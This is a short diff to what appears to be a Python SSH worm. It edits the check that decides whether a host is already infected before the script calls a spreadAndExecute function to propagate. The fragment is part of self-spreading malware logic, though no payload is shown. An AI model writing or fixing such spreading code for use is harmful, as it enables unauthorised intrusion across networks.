@@ -170,7 +170,7 @@ if len(sys.argv) < 3:
 			print("Now trying to spread ...")
 			print("Checking if the system already infected ...")
 
-			if isInfectedSystem(ssh_info[0]) == 0:
+			if isInfectedSystem(ssh_info[0]) == True:
 				print("No need to spread the worm.")
 			else:
 				spreadAndExecute(ssh_info[0])
